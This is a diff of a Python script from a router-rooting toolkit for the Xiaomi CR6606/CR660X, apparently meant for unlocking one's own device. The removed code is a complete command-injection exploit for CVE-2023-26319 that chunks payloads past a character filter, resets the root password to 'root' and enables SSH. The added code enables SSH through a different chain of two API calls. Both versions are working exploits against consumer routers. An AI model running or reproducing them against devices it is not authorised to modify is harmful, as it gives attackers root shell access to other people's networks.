@@ -1,20 +1,10 @@
 #!/usr/bin/env python3
-# cr660x/3.enable_ssh.py — 通过 smartcontroller 漏洞（CVE-2023-26319）启用 SSH
-#
-# 适用机型: 小米 CR6606 联通版 1.0.117 — MT7621, stock 固件 (nginx/1.12.2)
-# 漏洞原理: smart home scene executor 的 wan_block 动作 mac 字段无转义
-#           拼进 system()，触发 scene 即可执行任意命令
-# 前置:    路由器已初始化 + 一个有效 stok（步骤 2 输出）
-# 后置:    路由器 SSH 端口 22 可连，用户 root 密码 root
-# 来源:    xmir-patcher/connect5.py + xmir-patcher/test.txt
-#          实测日志（2026-06-11）显示 CR6606 1.0.117 release 走这条路径
-#
-# 输出:    stdout = 单个 JSON {"ok": bool, "step": ..., "data"|"error":..., "reason"?}
-#          stderr = 默认空白，--debug 时打印进度
-#          exit  = 0 成功 / 1 失败
+# cr660x/3.enable_ssh.py — extendwifi + oneclick 启用 SSH (通杀)
+# 前置: 路由器已初始化 + 一个有效 stok (步骤 2 输出)
+# 后置: 路由器 SSH 端口 22 可连
+# 来源: old_coding/haku-cr660x-sidehackwifi/刷机/test_login.sh (2026-03-28)
 
 import argparse
-import datetime
 import json
 import socket
 import sys
@@ -23,263 +13,66 @@ import urllib.error
 import urllib.parse
 import urllib.request
 
-# ============ 常量 ============
-DEFAULT_ROUTER_IP = "192.168.31.1"
-DEFAULT_TIMEOUT = 30
-SMARTCONTROLLER_TIMEOUT = 15
-SCENE_WAIT_SECONDS = 60
-SCENE_POLL_INTERVAL = 2
-SSH_PORT = 22
-ROOT_PASSWORD = "root"
-SCENE_HHMM = "3:4"
-SCENE_DATE_RAW = "203301020304"          # 给 `date -s` 用（无分隔符）
-SCENE_DATE_FULL = "2033-1-2 3:4:0"       # 给 set_sys_time / 探测用
-SPECIAL_CHARS = ['"', "\\", "`", "$", "\n"]
+DEFAULT_IP = "192.168.31.1"
+TIMEOUT = 60
+SSH_PROBE_RETRIES = 11
+SSH_PROBE_INTERVAL = 3
 STEP_NAME = "enable_ssh"
-DEBUG = False  # 运行时由 --debug 改写；默认静默（Rule of Silence）
+DEBUG = False
 
 
-# CR660X 1.0.117 的 sysapi macfilter 漏洞：
-#   cmdbuf = "/usr/sbin/sysapi macfilter set mac=%s wan=%s;..." 100 字节
-#   前缀固定部分 = len(vuln_cmd) = "/usr/sbin/sysapi macfilter set mac=;; wan=no;/usr/sbin/sysapi macfilter commit"
-MAX_CMD_LEN = 100 - 1 - len("/usr/sbin/sysapi macfilter set mac=;; wan=no;/usr/sbin/sysapi macfilter commit")
+def log(msg):
+    if DEBUG:
+        print(f"[{STEP_NAME}] {msg}", file=sys.stderr)
 
 
-# ============ 日志 / 输出 ============
-def log(msg: str, level: str = "INFO") -> None:
-    if not DEBUG:
-        return
-    ts = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
-    print(f"{ts} [{level}] {msg}", file=sys.stderr)
+def emit_ok(data):
+    print(json.dumps({"ok": True, "step": STEP_NAME, "data": data}, ensure_ascii=False))
 
 
-def emit_ok(data: dict) -> None:
-    print(json.dumps({"ok": True, "step": STEP_NAME, "data": data},
-                     ensure_ascii=False))
-
-
-def emit_err(error: str, reason: str = "", recoverable: bool = True) -> None:
-    out = {"ok": False, "step": STEP_NAME, "error": error,
-           "recoverable": recoverable}
+def emit_err(error, reason=""):
+    out = {"ok": False, "step": STEP_NAME, "error": error, "recoverable": True}
     if reason:
         out["reason"] = reason
     print(json.dumps(out, ensure_ascii=False))
 
 
-# ============ HTTP 基础 ============
-def api_request(base_url: str, stok: str, api_path: str, params: dict = None,
-               timeout: int = DEFAULT_TIMEOUT, post: bool = False):
-    """通用 API 请求。api_path 形式 'xqsystem/init_info'。
+def http_get(url, timeout):
+    with urllib.request.urlopen(url, timeout=timeout) as r:
+        return json.loads(r.read().decode("utf-8"))
 
-    返回 dict 或 None。HTTP 500 返回 None（hackCheck 探测等的预期路径）。
-    """
-    url = f"{base_url}/cgi-bin/luci/;stok={stok}/api/{api_path}"
-    if post:
-        encoded = urllib.parse.urlencode(params or {}).encode("utf-8")
-        req = urllib.request.Request(url, data=encoded)
-        req.add_header("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
-    else:
-        req = urllib.request.Request(url)
+
+def http_get_raw(url, timeout):
+    with urllib.request.urlopen(url, timeout=timeout) as r:
+        return r.read().decode("utf-8", errors="replace")
+
+
+def call_extendwifi_connect(stok, ip, ssid, password, timeout):
+    qs = urllib.parse.urlencode({"ssid": ssid, "password": password})
+    url = f"http://{ip}/cgi-bin/luci/;stok={stok}/api/misystem/extendwifi_connect?{qs}"
+    log(f"extendwifi_connect ssid={ssid!r}")
     try:
-        with urllib.request.urlopen(req, timeout=timeout) as resp:
-            return json.loads(resp.read().decode("utf-8"))
+        data = http_get(url, timeout)
     except urllib.error.HTTPError as e:
-        if e.code == 500:
-            return None  # Internal Server Error（hackCheck 探测等的预期路径）
-        body = ""
-        try:
-            body = e.read().decode("utf-8", errors="replace")[:200]
-        except Exception:
-            pass
-        raise RuntimeError(
-            f"{api_path} HTTP {e.code}（stok 可能过期或权限不足）: {body}"
-        ) from e
-    except json.JSONDecodeError:
-        raise RuntimeError(f"Received non-JSON from {api_path}")
+        raise RuntimeError(f"extendwifi_connect HTTP {e.code}: {e.read().decode('utf-8', errors='replace')[:200]}")
+    msg = (data.get("msg") or "").lower()
+    if "connect succces" not in msg:
+        raise RuntimeError(f"extendwifi_connect 失败: code={data.get('code')} msg={data.get('msg')!r}")
 
 
-def smartcontroller_post(base_url: str, stok: str, payload_dict: dict,
-                         timeout: int = SMARTCONTROLLER_TIMEOUT) -> str:
-    """POST 到 /api/xqsmarthome/request_smartcontroller，返回原始响应文本。"""
-    url = f"{base_url}/cgi-bin/luci/;stok={stok}/api/xqsmarthome/request_smartcontroller"
-    payload_str = json.dumps(payload_dict, separators=(",", ":"))
-    data = urllib.parse.urlencode({"payload": payload_str}).encode("utf-8")
-    req = urllib.request.Request(url, data=data)
-    req.add_header("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
-    with urllib.request.urlopen(req, timeout=timeout) as resp:
-        return resp.read().decode("utf-8")
-
-
-# ============ hackCheck 探测 ============
-def detect_hack_check(base_url: str, stok: str, timeout: int) -> int:
-    """探测 hackCheck 等级 0/1/2/3。3+ 表示 smartcontroller 链路已堵。
-
-    探测原理（来自 xmir/connect5.py）：
-      1. 试换行 \\n  → 500 → hackCheck >= 3
-      2. 试分号 ;    → 500 → hackCheck == 2
-      3. 试 ; 但读回值看是否被替换成空 → 1
-    """
-    log("探测 hackCheck 等级")
-    diag_set = {"iperf_test_thr": "25", "usb_write_thr": "0",
-                "usb_read_thr": "0", "disk_write_thr": "0", "disk_read_thr": "0"}
-
-    # 1. 试换行 \n
-    p1 = dict(diag_set); p1["usb_write_thr"] = "simple_payload\n"
-    if api_request(base_url, stok, "xqnetwork/diag_set_paras", p1, timeout, post=True) is None:
-        return 3  # \n 也被吃
-
-    # 2. 试分号 ;
-    p2 = dict(diag_set); p2["usb_write_thr"] = "simple_payload;"
-    if api_request(base_url, stok, "xqnetwork/diag_set_paras", p2, timeout, post=True) is None:
-        return 2  # ; 被吃
-
-    # 3. 试 ; 但读回值看是否被替换成空字符串
-    p3 = {"iperf_test_thr": "simple_payload;", "usb_write_thr": "11",
-          "usb_read_thr": "22", "disk_write_thr": "0", "disk_read_thr": "0"}
-    api_request(base_url, stok, "xqnetwork/diag_set_paras", p3, timeout, post=True)
-    diag = api_request(base_url, stok, "xqnetwork/diag_get_paras", timeout=timeout)
-    # 恢复
-    api_request(base_url, stok, "xqnetwork/diag_set_paras", diag_set, timeout, post=True)
-
-    raw = diag.get("iperf_test_thr")
+def call_oneclick_get_remote_token(stok, ip, timeout):
+    qs = urllib.parse.urlencode({"username": "xxx", "password": "xxx", "nonce": "xxx"})
+    url = f"http://{ip}/cgi-bin/luci/;stok={stok}/api/xqsystem/oneclick_get_remote_token?{qs}"
+    log("oneclick_get_remote_token")
     try:
-        if int(raw) == 25:
-            return 1  # ; 被切但 payload 跑了
-    except (TypeError, ValueError):
-        pass
-    return 0
-
-
-# ============ 时间 ============
-def get_device_systime(base_url: str, stok: str, timeout: int) -> dict:
-    r = api_request(base_url, stok, "misystem/sys_time", timeout=timeout)
-    if not r or r.get("code") != 0:
-        raise RuntimeError(f"get sys_time failed: {r}")
-    dst = r["time"]
-    if "'" in dst.get("timezone", "") or ";" in dst.get("timezone", ""):
-        dst["timezone"] = "GMT0"
-    return dst
-
-
-def set_device_systime(base_url: str, stok: str, dst: dict, wait: bool,
-                       timeout: int = DEFAULT_TIMEOUT) -> None:
-    params = {"time": f"{dst['year']}-{dst['month']}-{dst['day']} "
-                      f"{dst['hour']}:{dst['min']}:{dst['sec']}",
-              "timezone": dst.get("timezone", "GMT0")}
-    r = api_request(base_url, stok, "misystem/set_sys_time", params, timeout, post=True)
-    if not r or r.get("code") != 0:
-        raise RuntimeError(f"set_sys_time failed: {r}")
-    if wait:
-        time.sleep(3.1)
-
-
-# ============ smartcontroller 场景 ============
-def exec_tiny_cmd(base_url: str, stok: str, cmd: str, sep: str) -> None:
-    """注入一条小命令（≤MAX_CMD_LEN 字节）通过 scene。
-    注册 → 触发 → 清理 三步。sep=';' 或 '\\n'，由 hackCheck 决定。
-    """
-    if len(cmd) > MAX_CMD_LEN:
-        raise RuntimeError(f"Payload too long ({len(cmd)} > {MAX_CMD_LEN}): {cmd}")
-    name = f"it3_{int(time.time() * 1000) % 1000000:06d}"
-    scene = {
-        "command": "scene_setting",
-        "name": name,
-        "action_list": [{
-            "thirdParty": "xmrouter",
-            "delay": 17,
-            "type": "wan_block",
-            "payload": {"command": "wan_block", "mac": sep + cmd + sep},
-        }],
-        "launch": {"timer": {"time": SCENE_HHMM, "repeat": "0", "enabled": True}},
-    }
-    text = smartcontroller_post(base_url, stok, scene)
-    if "Internal Server Error" in text:
-        raise RuntimeError("scene_setting 返回 500（hackCheck 过高或 smartcontroller 不可用）")
-    try:
-        dres = json.loads(text)
-    except json.JSONDecodeError:
-        raise RuntimeError(f"scene_setting 返回非 JSON: {text}")
-    if dres.get("code") != 0:
-        raise RuntimeError(f"scene_setting 失败: {dres}")
-    scene_id = dres["id"]
-
-    # 触发
-    trigger = {"command": "scene_start_by_crontab", "time": SCENE_HHMM, "week": 0}
-    try:
-        text = smartcontroller_post(base_url, stok, trigger, timeout=10)
-        is_504 = False
+        text = http_get_raw(url, timeout)
     except urllib.error.HTTPError as e:
-        if e.code == 504:
-            is_504 = True
-            text = ""
-        else:
-            raise
-    is_timeout = (
-        is_504
-        or "504 Gateway Time-out" in text
-        or ("request server timeout" in text and "-101" in text)
-    )
-    if is_timeout:
-        log("___[504/-101]___（scene 触发 sleep 3s，预期超时，按成功处理）")
-        time.sleep(3)
-    else:
-        try:
-            dres = json.loads(text)
-            if dres.get("code") != 0:
-                raise RuntimeError(f"scene 触发失败: {dres}")
-        except json.JSONDecodeError:
-            raise RuntimeError(f"scene 触发返回非 JSON: {text!r}")
-
-    # 清理
-    smartcontroller_post(base_url, stok, {"command": "scene_delete", "id": scene_id})
+        raise RuntimeError(f"oneclick_get_remote_token HTTP {e.code}: {e.read().decode('utf-8', errors='replace')[:200]}")
+    if "nvram" not in text.lower():
+        raise RuntimeError(f"oneclick_get_remote_token 响应无 'nvram': {text[:200]}")
 
 
-def exec_cmd(base_url: str, stok: str, command: str, sep: str, fn: str = "/tmp/e") -> None:
-    """运行任意长命令：分块写入文件 → chmod → sh 执行。
-
-    字符黑名单: " \\ ` $ \\n。绕过: echo -ne "..." 多次追加到 /tmp/e。
-    """
-    if sep == "\n":
-        command = command.replace(" ; ", "\n")
-    else:
-        command = command.replace(" ; ", ";")
-
-    template = 'echo -n{spec} "{txt}"{amode}{fn}'
-    flen = len(template.format(spec="", txt="", amode="", fn=fn))
-
-    chunks: list[str] = []
-    buf = ""
-    for ch in command:
-        if len(buf) >= MAX_CMD_LEN - flen - len(">>"):
-            chunks.append(buf)
-            buf = ""
-        if ch in SPECIAL_CHARS:
-            if buf:
-                chunks.append(buf)
-            chunks.append(ch)
-            buf = ""
-            continue
-        buf += ch
-    if buf:
-        chunks.append(buf)
-
-    for i, chunk in enumerate(chunks):
-        amode = ">" if i == 0 else ">>"
-        spec = ""
-        if len(chunk) == 1 and chunk in SPECIAL_CHARS:
-            spec = "e"
-            if chunk == "\n":
-                chunk = "n"
-            chunk = f"\\{chunk}"
-        cmd = template.format(spec=spec, txt=chunk, amode=amode, fn=fn)
-        exec_tiny_cmd(base_url, stok, cmd, sep)
-
-    exec_tiny_cmd(base_url, stok, f"chmod +x {fn}", sep)
-    exec_tiny_cmd(base_url, stok, f"sh {fn}", sep)
-
-
-# ============ SSH 探测 ============
-def probe_ssh_port(host: str, port: int = SSH_PORT, timeout: int = 5) -> bool:
+def probe_ssh_port(host, port=22, timeout=5):
     try:
         with socket.create_connection((host, port), timeout=timeout):
             return True
@@ -287,200 +80,81 @@ def probe_ssh_port(host: str, port: int = SSH_PORT, timeout: int = 5) -> bool:
         return False
 
 
-# ============ 主流程 ============
-def enable_ssh(base_url: str, stok: str, timeout: int) -> dict:
-    host = base_url.split("//", 1)[1]  # 去掉 "http://"
-
-    # 1. hackCheck 探测
-    hack = detect_hack_check(base_url, stok, timeout)
-    log(f"hackCheck = {hack}")
-    if hack >= 3:
-        raise RuntimeError(f"smartcontroller 已被堵（hackCheck={hack}），需降级固件或换链路")
-    sep = "\n" if hack else ";"
-
-    # 2. 保存原时间
-    log("读取原系统时间")
-    dst = get_device_systime(base_url, stok, timeout)
-    log(f"原时间: {dst.get('year')}-{dst.get('month')}-{dst.get('day')} "
-        f"{dst.get('hour')}:{dst.get('min')}")
-
-    # 3. 热身：写 /tmp/ntp.status 触发 smartcontroller 服务懒启动
-    log("热身 smartcontroller 服务...")
-    set_device_systime(base_url, stok, dst, wait=True, timeout=timeout)
-
-    # 4. 32s 循环：注入 date -s 2033 验证链路
-    log(f"等待 smartcontroller 激活（最长 {SCENE_WAIT_SECONDS}s）...")
-    sc_activated = False
-    start = time.monotonic()
-    while time.monotonic() - start <= SCENE_WAIT_SECONDS:
-        time.sleep(SCENE_POLL_INTERVAL)
-        try:
-            exec_tiny_cmd(base_url, stok, f"date -s {SCENE_DATE_RAW}", sep)
-        except Exception as e:
-            log(f"tiny_cmd 失败: {e}（重试中...）")
-            continue
-        dxt = get_device_systime(base_url, stok, timeout)
-        if (dxt.get("year") == 2033 and dxt.get("month") == 1 and dxt.get("day") == 2
-                and dxt.get("hour") == 3 and dxt.get("min") == 4):
-            log("smartcontroller 链路验证成功（时间被改成 2033-01-02 03:04）")
-            sc_activated = True
-            break
-    if not sc_activated:
-        try:
-            set_device_systime(base_url, stok, dst, wait=False, timeout=timeout)
-        except Exception:
-            pass
-        try:
-            smartcontroller_post(base_url, stok, {"command": "reset_scenes"}, timeout=5)
-        except Exception:
-            pass
-        raise RuntimeError(f"smartcontroller 链路在 {SCENE_WAIT_SECONDS} 秒内未激活")
-
-    # 5. 恢复时间 + 给 smartcontroller 缓口气
-    log("恢复原系统时间")
-    time.sleep(1)
-    set_device_systime(base_url, stok, dst, wait=False, timeout=timeout)
-    time.sleep(3)
-
-    # 6. 注入 SSH 启用命令（按 xmir/test.txt 日志顺序）
-    log("nvram 启用 SSH...")
-    exec_tiny_cmd(base_url, stok, "nvram set ssh_en=1", sep)
-    exec_tiny_cmd(base_url, stok, "nvram commit", sep)
-    log("设置 root 密码...")
-    exec_tiny_cmd(base_url, stok, "echo root >/tmp/x", sep)
-    exec_tiny_cmd(base_url, stok, "echo root >>/tmp/x", sep)
-    exec_tiny_cmd(base_url, stok, "passwd root </tmp/x", sep)
-    log("解除 dropbear release 检查...")
-    exec_cmd(base_url, stok, "sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear", sep)
-    log("启用 dropbear...")
-    exec_cmd(base_url, stok, "/etc/init.d/dropbear enable", sep)
-    log("重启 dropbear...")
-    exec_cmd(base_url, stok, "/etc/init.d/dropbear restart", sep)
-
-    # 7. TCP 探测 22 端口
-    log(f"探测 TCP {host}:{SSH_PORT}...")
-    for attempt in range(11):
-        if probe_ssh_port(host, SSH_PORT):
-            log("SSH 已启用")
-            break
-        if attempt < 10:
-            log(f"端口未就绪，再等...（{attempt+1}/10）")
-            time.sleep(3)
-    else:
-        raise RuntimeError(f"SSH 端口 {SSH_PORT} 未打开（可能 dropbear 的 release 检查卡住了，需 sed 修复）")
-
-    # 清理
-    log("清理 /tmp 中转文件...")
-    try:
-        exec_tiny_cmd(base_url, stok, "rm -f /tmp/e /tmp/x", sep)
-    except Exception as e:
-        log(f"清理失败（非阻塞，重启后 /tmp 自动清空）: {e}")
-
-    return {"ip": host, "ssh_port": SSH_PORT, "root_password": ROOT_PASSWORD, "hack_check": hack}
-
-
-# ============ CLI ============
-def parse_args() -> argparse.Namespace:
-    p = argparse.ArgumentParser(
-        description="CR660X 步骤 3：启用 SSH（smartcontroller 漏洞 CVE-2023-26319）",
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog=(
-            "示例:\n"
-            "  python3 3.enable_ssh.py --stok <stok>\n"
-            "  python3 2.login_get_stok.py | python3 3.enable_ssh.py\n"
-            "  python3 2.login_get_stok.py | python3 3.enable_ssh.py --debug\n"
-        ),
-    )
-    p.add_argument("--ip", default=DEFAULT_ROUTER_IP,
-                   help=f"路由器 IP（默认: {DEFAULT_ROUTER_IP}）")
-    p.add_argument("--stok", default="",
-                   help="stok（来自步骤 2；空则从 stdin 读上游 JSON）")
-    p.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT,
-                   help=f"网络超时秒（默认: {DEFAULT_TIMEOUT}）")
-    p.add_argument("--debug", action="store_true",
-                   help="打印进度日志到 stderr（默认静默）")
-    return p.parse_args()
-
-
-def read_stok_from_stdin() -> str:
-    """从上游管道 JSON 读 stok。上游 ok:false 时把 error 透传出来，不再吞成"缺 stok"。"""
+def read_stok_from_stdin():
     if sys.stdin.isatty():
-        raise RuntimeError("未通过 stdin 管道传入上游 JSON，也未传 --stok")
+        raise RuntimeError("未传 --stok, stdin 也不是管道")
     text = sys.stdin.read()
     if not text.strip():
-        raise RuntimeError("stdin 为空（上游没产出 JSON）")
+        raise RuntimeError("stdin 为空")
     try:
         d = json.loads(text)
     except json.JSONDecodeError as e:
-        raise RuntimeError(f"上游 stdin 不是合法 JSON: {e}")
+        raise RuntimeError(f"stdin 不是合法 JSON: {e}")
     if d.get("ok") is False:
-        raise RuntimeError(f"上游失败: {d.get('error', '未知错误')}")
+        raise RuntimeError(f"上游失败: {d.get('error', '未知')}")
     stok = d.get("data", {}).get("stok", "")
     if not stok:
-        raise RuntimeError(f"上游 JSON 没有 data.stok 字段: {d}")
+        raise RuntimeError("上游 JSON 没有 data.stok")
     return stok
 
 
-def help_json() -> None:
-    schema = {
-        "script": STEP_NAME,
-        "description": "CR660X 步骤 3：启用 SSH（smartcontroller 漏洞 CVE-2023-26319）",
-        "args": [
-            {"name": "--ip", "type": "string", "default": DEFAULT_ROUTER_IP,
-             "required": False, "description": "路由器 IP"},
-            {"name": "--stok", "type": "string", "default": "",
-             "required": False, "description": "stok（空则从 stdin 读上游 JSON）"},
-            {"name": "--timeout", "type": "int", "default": DEFAULT_TIMEOUT,
-             "required": False, "description": "网络超时秒"},
-            {"name": "--debug", "type": "flag", "default": False,
-             "required": False, "description": "打印进度日志到 stderr"},
-        ],
-        "examples": [
-            "python3 3.enable_ssh.py --stok <stok>",
-            "python3 2.login_get_stok.py | python3 3.enable_ssh.py",
-        ],
-        "stdin_contract": {"expects": "上游 JSON (含 data.stok)", "produces": "含 ssh_port 的成功 JSON"},
-    }
-    print(json.dumps(schema, ensure_ascii=False, indent=2))
-
-
-def main() -> int:
+def main():
     global DEBUG
     if "--help-json" in sys.argv:
-        help_json()
+        schema = {
+            "script": STEP_NAME,
+            "description": "CR660X 步骤 3: extendwifi+oneclick 启用 SSH",
+            "args": [
+                {"name": "--ip", "default": DEFAULT_IP, "required": False},
+                {"name": "--stok", "default": "", "required": False,
+                 "description": "stok (空则从 stdin 读)"},
+                {"name": "--extendwifi-ssid", "default": "socket.gethostname()", "required": False,
+                 "description": "占位 SSID (路由器不真连)"},
+                {"name": "--extendwifi-password", "default": "12345678", "required": False},
+                {"name": "--timeout", "default": TIMEOUT, "required": False},
+                {"name": "--debug", "default": False, "required": False},
+            ],
+            "examples": [
+                "python3 3.enable_ssh.py --stok <stok>",
+                "python3 2.login_get_stok.py --pwd mypass | python3 3.enable_ssh.py",
+            ],
+            "stdin_contract": {"expects": "上游 JSON (含 data.stok)", "produces": "含 ssh_port 的成功 JSON"},
+        }
+        print(json.dumps(schema, ensure_ascii=False, indent=2))
         return 0
 
-    args = parse_args()
+    p = argparse.ArgumentParser(description="CR660X 步骤 3: 启用 SSH (extendwifi+oneclick)")
+    p.add_argument("--ip", default=DEFAULT_IP)
+    p.add_argument("--stok", default="")
+    p.add_argument("--extendwifi-ssid", default=socket.gethostname())
+    p.add_argument("--extendwifi-password", default="12345678")
+    p.add_argument("--timeout", type=int, default=TIMEOUT)
+    p.add_argument("--debug", action="store_true")
+    args = p.parse_args()
     DEBUG = args.debug
 
     try:
         stok = args.stok or read_stok_from_stdin()
     except RuntimeError as e:
-        log(str(e), level="ERROR")
-        emit_err(str(e), reason="stok_missing", recoverable=True)
+        emit_err(str(e), reason="stok_missing")
         return 1
 
-    base_url = f"http://{args.ip}"
     try:
-        data = enable_ssh(base_url, stok, args.timeout)
+        call_extendwifi_connect(stok, args.ip, args.extendwifi_ssid, args.extendwifi_password, args.timeout)
+        call_oneclick_get_remote_token(stok, args.ip, args.timeout)
     except RuntimeError as e:
-        log(str(e), level="ERROR")
-        err_msg = str(e)
-        reason = "unknown"
-        if "smartcontroller" in err_msg or "hackCheck" in err_msg:
-            reason = "smartcontroller_unavailable"
-        elif "stok" in err_msg.lower():
-            reason = "stok_expired"
-        elif "SSH 端口" in err_msg:
-            reason = "ssh_port_not_open"
-        emit_err(err_msg, reason=reason, recoverable=True)
+        emit_err(str(e), reason="ssh_failed")
         return 1
-    except Exception as e:
-        log(str(e), level="ERROR")
-        emit_err(str(e), reason="unknown", recoverable=True)
-        return 1
-    emit_ok(data)
-    return 0
+
+    log(f"探测 TCP {args.ip}:22 (最多 {SSH_PROBE_RETRIES}x{SSH_PROBE_INTERVAL}s)...")
+    for i in range(SSH_PROBE_RETRIES):
+        if probe_ssh_port(args.ip):
+            emit_ok({"ip": args.ip, "ssh_port": 22})
+            return 0
+        if i < SSH_PROBE_RETRIES - 1:
+            time.sleep(SSH_PROBE_INTERVAL)
+    emit_err(f"SSH 端口 22 在 {SSH_PROBE_RETRIES * SSH_PROBE_INTERVAL}s 内未打开", reason="ssh_failed")
+    return 1
 
 
 if __name__ == "__main__":
